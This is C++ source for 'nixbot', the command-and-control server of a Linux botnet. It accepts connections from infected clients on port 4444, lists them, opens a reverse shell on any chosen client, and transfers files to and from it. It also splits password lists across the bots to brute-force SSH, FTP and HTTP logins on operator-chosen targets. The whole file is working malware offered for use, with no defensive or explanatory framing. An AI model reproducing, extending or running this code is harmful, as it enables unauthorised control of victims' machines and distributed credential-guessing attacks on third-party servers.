#include <string.h>
#include <errno.h>
#include <arpa/inet.h>
#include <unistd.h>
#include <thread>
#include <vector>
#include <iostream>
#include <fstream>
#include <sys/stat.h>
#include <sys/file.h>

struct client_info {
    int * connection;
    std::string address;
    std::string current_user;
    std::string current_dir;

    //download
	unsigned long file_size; //size of the received file
	unsigned long current_size = 0; //number of bytes that we got so far
	std::string file_location;

    //upload
	bool uploading = false;
};

struct saved_output {
    std::string address;
    std::string output;
};

struct bruteforce_info {
    std::string list_name;
    std::ifstream input;
    bool found_it;
    bool bruteforcing = false;
    std::vector<int> turns;
    long nbr_passwords = 0;
    long curr_nbr = 0;
} bruteforce_info_struct;

std::vector<client_info> client_info_vector;
std::vector<saved_output> saved_output_vector;
int current_interaction = -1;

#include "../includes/file_send.h"

void accept_thread(int *);
void recv_thread(int);
void heartbeat_thread(int);
int send_data(char *, int, int);
int recv_data(char *, int, int, int);
void load_bruteforce(short, char *);
void bruteforce_thread(short);
void message_handler(char *, int);
void clean_specific(int);
void cleanup();

std::string nixbot_logo = "\
\t\t       _      _           _   \n\
\t\t      (_)    | |         | |  \n\
\t\t _ __  ___  _| |__   ___ | |_ \n\
\t\t| '_ \\| \\ \\/ / '_ \\ / _ \\| __|\n\
\t\t| | | | |>  <| |_) | (_) | |_ \n\
\t\t|_| |_|_/_/\\_\\_.__/ \\___/ \\__|\n\
\t\t                              \n\
\t\t\tCoded by: dotcppfile and Team Salvation";

std::string help_message = "\n\
Commands:\n\
---------\n\
    list                              | Lists all clients\n\
    interact <id>                     | Launches a reverse shell with the client\n\
        download </remote/file>:</to> | Downloads a remote file from the client\n\
        upload </local/file>:</to>    | Uploads a file to the client\n\
        exit                          | Stops the reverse shell\n\
        clear                         | Clears the console\n\
    sshbruteforce                     | Launches a SSH Bruteforce attack\n\
        -host <host>                  | (NOT NULL)\n\
        -port <port>                  | (NOT NULL)\n\
        -user <user>                  | (NOT NULL)\n\
        -list <location>              | Local Passwords List Location (NOT NULL)\n\
    httpbruteforce                    | Launches a HTTP Bruteforce attack\n\
        -url <link>                   | (NOT NULL) \n\
        -post <data>                  | GET will be used if not passed | Ex: username=dotcppfile&password=BRUTEFORCE\n\
        -string <value>               | Value showing on a TRUE page(valid login) (NOT NULL)\n\
        -agent <value>                | User Agent (NOT NULL)\n\
        -frs                          | Follow redirections\n\
        -list <location>              | Local Passwords List Location (NOT NULL)\n\
    ftpbruteforce                     | Launches a FTP Bruteforce attack\n\
        -host <host>                  | (NOT NULL)\n\
        -user <user>                  | (NOT NULL)\n\
        -list <location>              | Local Passwords List Location (NOT NULL)\n\
    stopbruteforce                    | Stops sending passwords to the clients\n\
    status                            | Shows the current status of running attacks\n\
    help                              | Shows this message\n\
    clear                             | Clears the console\n\
    exit                              | Close all connections and Exit\n";

int main() {
    int host_port= 4444;

    struct sockaddr_in my_addr;

    int hsock;

    //creating new socket
    hsock = socket(AF_INET, SOCK_STREAM, 0); //0 so that the system will chose the TCP Protocol for socket type SOCK_STREAM
    if(hsock == -1) {
        std::cout << "Error initializing socket: " << errno << std::endl;
        return 0;
    }

    int *p_int = new int;
    *p_int = 1; //option enabled
    if((setsockopt(hsock, SOL_SOCKET, SO_REUSEADDR, (char*)p_int, sizeof(int)) == -1) || (setsockopt(hsock, SOL_SOCKET, SO_KEEPALIVE, (char*)p_int, sizeof(int)) == -1)) {
        std::cout << "Error setting options: " << errno << std::endl;
        delete p_int;
        return 0;
    }
    delete p_int;

    my_addr.sin_family = AF_INET ;
    my_addr.sin_port = htons(host_port);
    memset(&(my_addr.sin_zero), 0, 8);
    my_addr.sin_addr.s_addr = INADDR_ANY; //the symbolic constatnt INADDR_ANY contains the ip address of the machine on which the server is running

    if(bind(hsock, (sockaddr*)&my_addr, sizeof(my_addr)) == -1) {
        std::cout << "Error binding to socket: " << errno << std::endl;
        return 0;
    }

    if(listen(hsock, 10) == -1) {
        std::cout << "Error listening: " << errno << std::endl;
        return 0;
    }

    std::thread start(accept_thread, &hsock);
    start.detach();

	std::cout << nixbot_logo.c_str() << std::endl;

    while (true) {
        current_interaction = -1;

        if (saved_output_vector.size() > 0)
            std::cout << "\nSaved Outputs:\n---------------" << std::endl;
        for (int i = 0; i < saved_output_vector.size(); i++)
            std::cout << "    " << saved_output_vector[i].address.c_str() << ":" << saved_output_vector[i].output.c_str();
        for (int i = 0; i < saved_output_vector.size(); i++)
            saved_output_vector.erase(saved_output_vector.begin() + i, saved_output_vector.begin() + i + 1);
		std::cout << std::endl << std::endl;

        char *command = new char[1025];
        std::cout << "> ";
		std::cout.flush();
		std::cin.getline(command, 1024);

        int id;

        if (strlen(command) == 0) {
			delete[] command;
			continue;
		} else if (strcmp(command, "help") == 0) {
			delete[] command;
			std::cout << help_message.c_str() << std::endl;
			continue;
        } else if (strcmp(command, "clear") == 0) {
            delete[] command;
            std::cout << "\033[2J\033[1;1H" << std::endl;
            continue;
		} else if (strncmp(command, "interact", 8) == 0) {
            command += 9;
            id = atoi(command);
            command -= 9;
            delete[] command;

			current_interaction = id;

            if ((0 <= id) && (id < client_info_vector.size())) {
                std::cout << "[INFO] Interacting with: " << client_info_vector[id].address.c_str() << std::endl;
            } else {
                std::cout << "[ERROR] Client doens't exist" << std::endl;
                continue;
            }
        } else if (strcmp(command, "list") == 0) {
            delete[] command;

            std::cout << std::endl << "Clients:" << std::endl << "--------" << std::endl;
            for (unsigned int i = 0; i < client_info_vector.size(); i++)
                if (client_info_vector[i].connection != nullptr)
                    std::cout << "    " << i << " | " << client_info_vector[i].address.c_str() << " | "  << client_info_vector[i].current_user.c_str() << " | " << client_info_vector[i].current_dir.c_str() << std::endl;
			std::cout << std::endl;

            continue;
        } else if (strcmp(command, "exit") == 0) {
            std::cout << "Exiting..." << std::endl;
            delete[] command;
            break;
        } else if (strcmp(command, "stopbruteforce") == 0) {
            bruteforce_info_struct.bruteforcing = false;
            delete[] command;
            continue;
        } else if (strcmp(command, "status") == 0) {
            std::cout << std::endl << "Status:" << std::endl << "-------" << std::endl;
            if (bruteforce_info_struct.bruteforcing == true) {
                std::cout << "Bruteforce: " << bruteforce_info_struct.curr_nbr << "/" << bruteforce_info_struct.nbr_passwords << std::endl;
            }
            std::cout << std::endl;

            delete[] command;
            continue;
        } else if (strncmp(command, "httpbruteforce", 14) == 0) {
            if (bruteforce_info_struct.bruteforcing == true) {
                std::cout << "[ERROR] A bruteforce attack is already running" << std::endl;
                delete command;
                continue;
            }

            command += 14; //we don't want to skip the ' ' on this one

            //lets get our badass pointers ready
            char *plink = nullptr;
            char *ppost = nullptr;
            char *plist = nullptr;
            char *pstring = nullptr;
            char *puseragent = nullptr;
            char frs = '0';

            //you bastards are gonna like this
            size_t command_size = strlen(command); //because we will be adding \0 which will change the output of strlen
            for (int i = 0; i < command_size; i++) {
                if (command[i] == '-') {
                    command[i - 1] = '\0'; //replaced the ' ' with a \0
                    i++;

                    if (command[i] == 'u') { //url
                        i += 4;
                        plink = &command[i];
                    } else if (command[i] == 'p') {//post
                        i += 5;
                        ppost = &command[i];
                    } else if (command[i] == 'l') { //list
                        i += 5;
                        plist = &command[i];
                    } else if (command[i] == 's') { //string
                        i += 7;
                        pstring = &command[i];
                    } else if (command[i] == 'a') { //agent
                        i += 6;
                        puseragent = &command[i];
                    } else if (command[i] == 'f') { //frs
                        i += 3;
                        frs = '1';
                    }
                }
            }

            if ((plink == nullptr) || (plist == nullptr) || (pstring == nullptr) || (puseragent == nullptr))
                std::cout << "[ERROR] Missing parameters/values" << std::endl;
            else {
                char *bytes;
                if (ppost == nullptr)
                    bytes = new char[41 + strlen(plink) + strlen(pstring) + strlen(puseragent)]; //+41 for "nixbot_httpbruteforce::", frs,\0, ::(x5) and (null)
                else
                    bytes = new char[35 + strlen(plink) + strlen(ppost) + strlen(pstring) + strlen(puseragent)]; //+35 for "nixbot_httpbruteforce::", frs,\0 and ::(x5)
                sprintf(bytes, "nixbot_httpbruteforce::%s::%s::%s::%s::%c::", plink, ppost, pstring, puseragent, frs);

                bruteforce_info_struct.list_name = plist;

                load_bruteforce(1, bytes);
            }

            command -= 14;
            delete[] command;
            continue;
        } else if (strncmp(command, "ftpbruteforce", 13) == 0) {
            if (bruteforce_info_struct.bruteforcing == true) {
                std::cout << "[ERROR] A bruteforce attack is already running" << std::endl;
                delete command;
                continue;
            }

            command += 13; //we don't want to skip the ' ' on this one

            //lets get our badass pointers ready
            char *phost = nullptr;
            char *pusername = nullptr;
            char *plist = nullptr;

            //you bastards are gonna like this
            size_t command_size = strlen(command); //because we will be adding \0 which will change the output of strlen
            for (int i = 0; i < command_size; i++) {
                if (command[i] == '-') {
                    command[i - 1] = '\0'; //replaced the ' ' with a \0
                    i++;

                    if (command[i] == 'h') { //host
                        i += 5;
                        phost = &command[i];
                    } else if (command[i] == 'u') {//user
                        i += 5;
                        pusername = &command[i];
                    } else if (command[i] == 'l') { //list
                        i += 5;
                        plist = &command[i];
                    }
                }
            }

            if ((phost == nullptr) || (pusername == nullptr) || (plist == nullptr))
                std::cout << "[ERROR] Missing parameters/values" << std::endl;
            else {
                size_t bytes_size = 27 + strlen(phost) + strlen(pusername); //27 for "nixbot_ftpbruteforce::" + ::(x2)
                char *bytes = new char[bytes_size];
                sprintf(bytes, "nixbot_ftpbruteforce::%s::%s::", phost, pusername);

                bruteforce_info_struct.list_name = plist;

                load_bruteforce(2, bytes);
            }

            command -= 13;
            delete[] command;
            continue;
        } else if (strncmp(command, "sshbruteforce", 13) == 0) {
            if (bruteforce_info_struct.bruteforcing == true) {
                std::cout << "[ERROR] A bruteforce attack is already running" << std::endl;
                delete command;
                continue;
            }

            command += 13; //we don't want to skip the ' ' on this one

            //lets get our badass pointers ready
            char *phost = nullptr;
            char *pport = nullptr;
            char *pusername = nullptr;
            char *plist = nullptr;

            //you bastards are gonna like this
            size_t command_size = strlen(command); //because we will be adding \0 which will change the output of strlen
            for (int i = 0; i < command_size; i++) {
                if (command[i] == '-') {
                    command[i - 1] = '\0'; //replaced the ' ' with a \0
                    i++;

                    if (command[i] == 'h') { //host
                        i += 5;
                        phost = &command[i];
                    } else if (command[i] == 'p') {//port
                        i += 5;
                        pport = &command[i];
                    } else if (command[i] == 'u') {//user
                        i += 5;
                        pusername = &command[i];
                    } else if (command[i] == 'l') { //list
                        i += 5;
                        plist = &command[i];
                    }
                }
            }

            if ((phost == nullptr) || (pport == nullptr) || (pusername == nullptr) || (plist == nullptr))
                std::cout << "[ERROR] Missing parameters/values" << std::endl;
            else {
                size_t bytes_size = 29 + strlen(phost) + strlen(pport) + strlen(pusername); //27 for "nixbot_ftpbruteforce::" + ::(x3)
                char *bytes = new char[bytes_size];
                sprintf(bytes, "nixbot_sshbruteforce::%s::%s::%s::", phost, pport, pusername);

                bruteforce_info_struct.list_name = plist;

                load_bruteforce(3, bytes);
            }

            command -= 13;
            delete[] command;
            continue;
        } else {
            std::cout << "[ERROR] Invalid command" << std::endl;
            delete[] command;
            continue;
        }

        while (client_info_vector[id].connection != nullptr) {
            std::cout << client_info_vector[id].current_dir.c_str() << "# ";

            char *input = new char[1025];
            std::cin.getline(input, 1024);

            if (strcmp(input, "exit") == 0) {
                current_interaction = -1;
				delete[] input;
                break;
            } else if(strcmp(input, "clear") == 0) {
                delete[] input;
                std::cout << "\033[2J\033[1;1H" << std::endl; //ENCODIN MASTA
                continue;
			} else if(strlen(input) == 0) {
				delete[] input;
                continue;
			} else if (strncmp(input, "download", 8) == 0) {
				if (client_info_vector[id].current_size != 0) {
					std::cout << "[ERROR] Already downloading from this Client" << std::endl;
					delete[] input;
					continue;
				}

				input += 9;

                int input_size = strlen(input);
                int i;
                for (i = 0; i < input_size - 1; i++) {
                    if (input[i] == ':') {
                        input[i] = '\0';
                        break;
                    }
                }

                if (i == input_size - 1) {
                    std::cout << "[ERROR] Missing arguments for command 'download'" << std::endl;
                    input -= 9;
                    delete[] input;
                    continue;
                }

                client_info_vector[id].file_location = &input[i + 1];

                input -= 9;

                if (send_data(input, strlen(input) + 1, id) == 0) {
                    delete[] input;
                    break;
                }
			} else if (strncmp(input, "upload", 6) == 0) { //upload files to the client
                if (client_info_vector[id].uploading == false) {
                    client_info_vector[id].uploading = true;

                    input += 7;

                    int input_size = strlen(input);
                    int i;
                    for (i = 0; i < input_size - 1; i++) {
                        if (input[i] == ':') {
                            input[i] = '\0';
                            break;
                        }
                    }

                    if (i == input_size - 1) {
                        std::cout << "[ERROR] Missing arguments for command 'upload'" << std::endl;
                        input -= 7;
                        delete[] input;
                        continue;
                    }

                    struct stat statbuf;
                    if (stat(input, &statbuf) == -1) {
                        input -= 7;
                        delete[] input;
                        std::cout << "[ERROR] Failed retreiving the file's size: " << errno << std::endl;
                        continue;
                    }

                    char *file_info = new char[strlen(&input[i + 1]) + 40]; //13 characters for the size of the file
                    sprintf(file_info, "nixbot_file_location::%s::%Lu", &input[i + 1], (unsigned long)statbuf.st_size);

                    if (send_data(file_info, strlen(file_info) + 1, id) == 0) {
                        input -= 7;
                        delete[] input;
                        delete[] file_info;
                        break;
                    }

                    delete[] file_info;

                    file_send *file_send_class = new file_send(input, (long)statbuf.st_size, &client_info_vector[id].connection);
                    file_send_class->file_send_class = file_send_class;
                    std::thread start(&file_send::upload_file, file_send_class);
                    start.detach();

                    input -= 7;
                } else
                    std::cout << "[ERROR] Already uploading to this Client" << std::endl;
			} else { //system commands
				if (send_data(&input[0], strlen(input) + 1, id) == 0) {
					delete[] input;
					break;
				}
			}

			delete[] input;
			std::cin.get();
        }
    }

    cleanup();
    return 0;
}

void accept_thread(int *hsock) {
    while(true) {
        sockaddr_in sadr;
        socklen_t addr_size = sizeof(sockaddr_in);

        int* csock = new int;
        if((*csock = accept(*hsock, (sockaddr *)&sadr, &addr_size)) != -1) {
            char address[22];
            sprintf(address, "%s:%d", inet_ntoa(sadr.sin_addr), (int)sadr.sin_port);

            client_info client_info_struct;
            client_info_struct.connection = csock;
            client_info_struct.address = address;
            client_info_vector.push_back(client_info_struct);

            std::thread start(recv_thread, client_info_vector.size() - 1);
            start.detach();

            send_data((char *)"nixbot_get_info::", 18, client_info_vector.size() - 1);
        }
    }
}

void recv_thread(int id) {
    while (client_info_vector[id].connection != nullptr) {
        int bytes_received;
        char buffer[5002]; //received (4095 + 7 extra characters for nixbot_)

        if ((bytes_received = recv_data(&buffer[0], 4095, 0, id)) == 0)
			return;
        memcpy(&buffer[bytes_received], (char*)"nixbot_", 7);

        char delimiter[] = "\0nixbot_"; //our delimiter

        for (int i = 0, j = 0; i < bytes_received; i++) {
            if (memcmp(&buffer[i], &delimiter[0], 8) == 0) { //we got a part
                char *part = new char[i - j + 1]; //allocate space for this command
                memcpy(part, &buffer[j], i - j + 1);

                if (strncmp(part, "nixbot_get_info::", 17) == 0) {
                    part += 17;
                    std::string buffer_string = part; //because I'm a lazy fuck that wants to use find.
                    part -= 17;

                    size_t found = buffer_string.find("::");
                    client_info_vector[id].current_user = buffer_string.substr(0, found);

                    buffer_string.erase(0, found + 2);

                    client_info_vector[id].current_dir = buffer_string.substr(0, buffer_string.size());

                    std::thread start(heartbeat_thread, id);
                    start.detach();
                } else if (strncmp(part, "nixbot_new_path::", 17) == 0) {
                    part += 17;
                    client_info_vector[id].current_dir = part;
                    part -= 17;
                } else if (strncmp(part, "nixbot_download_size::", 22) == 0)
                    client_info_vector[id].file_size = atol(&part[22]);
                else if (strncmp(part, "nixbot_file_bytes::", 19) == 0) {
                    std::ofstream output(client_info_vector[id].file_location, std::ios::binary | std::ios::app);
                    if (output.is_open()) {
                        output.write(&part[19], bytes_received - 20);
                        output.close();
                    } //and we'll just keep it this way

                    client_info_vector[id].current_size += bytes_received - 20;
                    if (client_info_vector[id].current_size == client_info_vector[id].file_size) {
                        client_info_vector[id].current_size = 0;
                        message_handler((char *)"[INFO] Finished downloading", id);
                    }
                } else if (strcmp(part, "nixbot_upload_complete::") == 0) {
                    client_info_vector[id].uploading = false;
                } else if (strcmp(part, "nixbot_pass::S") == 0) { //sent by the bruteforcers running on the clients
                    if ((bruteforce_info_struct.input.is_open()) && (bruteforce_info_struct.found_it == false) && (bruteforce_info_struct.bruteforcing == true)) //we're still bruteforcing
                        bruteforce_info_struct.turns.push_back(id);
                } else if (strncmp(part, "nixbot_pass::", 13) == 0) { //password found
                    bruteforce_info_struct.found_it = true;
                    bruteforce_info_struct.bruteforcing = false;
                    bruteforce_info_struct.input.close();
                    message_handler(&part[13], id);
                } else//pass the data
                    message_handler(part, id);

                delete[] part;

                j = i + 1;
            }
        }
	}
}

void heartbeat_thread(int id) {
    while (client_info_vector[id].connection != nullptr) {
        if (current_interaction == id) //do not send a ping message when we're interacting
            continue;
        else if (send_data((char *)"nixbot_ping::", 14, id) == 0)
            break;

        sleep(1);
    }
}

void load_bruteforce(short protocol, char *bytes) { //we'll use this for every bruteforcer
    bruteforce_info_struct.found_it = false;
    bruteforce_info_struct.nbr_passwords = 0;
    bruteforce_info_struct.curr_nbr = 0;

    bruteforce_info_struct.input.open(bruteforce_info_struct.list_name.c_str());
    if (!bruteforce_info_struct.input.is_open()) {
        std::cout << "[ERROR] Failed to open list: " << errno << std::endl;
        return;
    }

    //get the number of passwords
    std::string line;
    while (getline(bruteforce_info_struct.input, line))
        bruteforce_info_struct.nbr_passwords++;
    bruteforce_info_struct.input.clear();
    bruteforce_info_struct.input.seekg(0, std::ios::beg);
    std::cout << "[INFO] Number of passwords: " << bruteforce_info_struct.nbr_passwords << std::endl;

    bruteforce_info_struct.bruteforcing = true;

    for (int i = 0; i < client_info_vector.size(); i++)
        send_data(bytes, strlen(bytes) + 1, i);
    delete[] bytes;

    bruteforce_info_struct.turns.clear();

    std::thread start(bruteforce_thread, protocol);
    start.detach();
}

void bruteforce_thread(short protocol) { //bruteforce thread
    while (bruteforce_info_struct.input.is_open()) {
        if (bruteforce_info_struct.turns.size() == 0)
            continue;

        char bytes[4095];
        int bytes_count;
        if (protocol == 1) { //http
            strcpy(bytes, "nixbot_httppasswords::");
            bytes_count = 22;
        } else if (protocol == 2) { //ftp
            strcpy(bytes, "nixbot_ftppasswords::");
            bytes_count = 21;
        } else if (protocol == 3) { //ftp
            strcpy(bytes, "nixbot_sshpasswords::");
            bytes_count = 21;
        }

        for (short current_password = 0; ((current_password < 200) && (bruteforce_info_struct.input.is_open())); current_password++) {
            std::string line;
            getline(bruteforce_info_struct.input, line);

            bruteforce_info_struct.curr_nbr++;

            memcpy(&bytes[bytes_count], (char *)line.c_str(), line.size() + 1); //the nulls will be the delimiters
            bytes_count += line.size() + 1;

            if (bruteforce_info_struct.input.eof()) {
                bruteforce_info_struct.input.close();
                break;
            }
        }

        //if a client disconnects then the passwords that he's supposed to try will be lost
        //I'll fix this later on
        send_data((char*)bytes, bytes_count, bruteforce_info_struct.turns[0]);
        bruteforce_info_struct.turns.erase(bruteforce_info_struct.turns.begin(), bruteforce_info_struct.turns.begin() + 1);
    }
}

void message_handler(char *buffer, int id) {
    if (current_interaction == id)
        std::cout << buffer << std::endl;
    else {
        saved_output save_output_struct;
        save_output_struct.address = client_info_vector[id].address;
        save_output_struct.output = buffer;
        saved_output_vector.push_back(save_output_struct);
    }
}

int send_data(char *data, int size, int id) {
    int bytecount;
    if((bytecount = send(*client_info_vector[id].connection, data, size, 0)) == -1) {
        char buffer[32]; // +3 errno +1 \0
        sprintf(buffer, "[ERROR] Error sending data: %d", errno);
        message_handler((char *)buffer, id);

        clean_specific(id);
		return 0;
    }

    return bytecount;
}

int recv_data(char *data, int size, int flags, int id) {
    int bytecount = recv(*client_info_vector[id].connection, data, size, flags);
    if ((bytecount == -1) || (bytecount == 0)) { //error occured or client shutdown
        char buffer[34]; // +3 errno +1 \0
        sprintf(buffer, "[ERROR] Error receiving data: %d", errno);
        message_handler((char *)buffer, id);

        clean_specific(id);
        return 0;
    }

    data[bytecount] = '\0'; //way faster than using memset or bzero on the whole buffer
    return bytecount;
}

void clean_specific(int id) {
    shutdown(*client_info_vector[id].connection, 2);
    close(*client_info_vector[id].connection);
    delete client_info_vector[id].connection;
    client_info_vector[id].connection = nullptr; //this will help avoiding double deletion and memory corruption
}

void cleanup() {
    for (unsigned int i = 0; i < client_info_vector.size(); i++)
        if (client_info_vector[i].connection != nullptr)
            clean_specific(i);
}
